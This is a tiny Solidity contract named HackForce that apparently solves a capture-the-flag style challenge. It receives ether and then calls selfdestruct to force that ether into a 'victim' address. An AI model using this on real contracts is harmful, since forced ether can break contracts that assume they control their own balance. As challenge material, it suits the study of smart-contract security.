pragma solidity ^0.5.0;

contract HackForce {
    function () payable external {}
    
    function hack(address payable victim) public {
        selfdestruct(victim);
    }
}